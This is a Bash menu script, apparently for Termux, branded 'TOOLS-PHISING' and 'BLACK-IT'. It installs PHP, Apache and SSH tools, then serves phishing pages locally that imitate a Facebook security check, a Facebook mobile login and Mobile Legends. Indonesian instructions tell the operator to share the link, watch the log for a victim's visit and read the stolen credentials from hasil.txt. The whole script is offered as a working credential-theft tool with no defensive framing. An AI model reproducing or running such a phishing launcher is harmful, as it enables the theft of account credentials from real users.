clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
toilet -f future "TOOLS-PHISING" | lolcat
echo $pur"Author : Mr.J"
echo $pur"____________________________________"
toilet -f future "WELCOME TO TOOLS BLACK-IT"
toilet -f term "   /\_/\ " | lolcat
toilet -f term " =[ •~• ]= " | lolcat
toilet -f term "    [\]_" | lolcat
toilet -f term "  |\    /| " | lolcat
toilet -f term "  | \  / | " | lolcat
toilet -f term "  |  \/  | " | lolcat
echo $i "BLACK-IT"
echo $i "TOOLS-PHISING"
echo $pur"____________________________________"
sleep 1
echo
echo $i"BY MR.J TOOLS PHISING BLACK-IT"
echo $pur"[" $ku"?" $pur"]" $ku"MR.J BLACK-IT"
echo $pur"[" $ku"?" $pur"]" $ku"HACKING ACCOUNT"
echo $pur"____________________________________"
echo $pur"["$ku"1"$pur"]"$ku" INSTALL ALL MODULES NEEDED"
echo $pur"["$ku"2"$pur"]"$ku" FACEBOOK SECURITY"
echo $pur"["$ku"3"$pur"]"$ku" FACEBOOK LOGIN"
echo $pur"["$ku"4"$pur"]"$ku" FREEFIRE"
echo $pur"["$ku"5"$pur"]"$ku" MOBILE LEGENDS"
echo $pur"["$ku"6"$pur"]"$ku" UPDATE"
echo $pur"["$ku"7"$pur"]"$ku" CEK HASIL PHISHING"
echo $pur"["$ku"8"$pur"]"$ku" EXIT"
echo $pur"____________________________________"
echo $pur"╭─["$pur"BLACK-IT@Root"$pur"]"
read -p"╰─>> " pil

if [ $pil = 1 ]
then
pkg update
pkg upgrade
apt-get install bash
apt install apache2
pkg install nano
pkg install python2
pkg install ruby toilet figlet
gem install lolcat
apt install openssh
apt install autossh
pkg install php
echo $cy"all modules was succesfuly installed"
sleep 4
sh BlackIT.sh
fi

if [ $pil = 2 ]
then
echo $i"Openning..."
sleep 1
echo $pur"now open new session and run Next.sh"
echo $ku"__________________________________"
sleep 1
echo $pur"  PHISING FACEBOOK SECURITY CHECK  "
php -S 127.0.0.1:8080
fi

if [ $pil = 3 ]
then
echo $i"Openning..."
sleep 1
echo $pur"now open new session and run Next.sh"
echo $ku"----------------------------------------------------------------------------------"
echo $pur"[+]PHISING FACEBOOK MOBILE LOGIN"
echo $pur"[+]SALIN LINK YANG ADA DI TANDA ()"
echo $pur"[+]JIKA LOG BERJALAN TANDANYA KORBAN SUDAH MASUK KE DALAM LINK"
echo $pur"[+]JIKA INGIN MELIHAT HASIL KETIK CTRL+C DAN KETIK php hasil.txt"
echo $ku"----------------------------------------------------------------------------------"
php -S 127.0.0.1:8080
fi

if [ $pil = 4 ]
then
echo $i" Coming Soon, need to update "
fi

if [ $pil = 5 ]
then
echo $i"Openning..."
sleep 1
echo $pur"now open new session and run Next.sh"
echo $ku"_________________________________"
echo $pur"  PHISING MOBILE LEGEND"
php -S localhost:8080 -t ~/BLACK-IT/Ml
fi

if [ $pil = 6 ]
then
git pull
fi

if [ $pil = 7 ]
then
php hasil.txt
fi

if [ $pil = 8 ]
then
echo
echo
echo $pur "Thanks For Using This Tool"
sleep 2
echo $ku "BLACK-IT"
echo
sleep 1
exit
fi
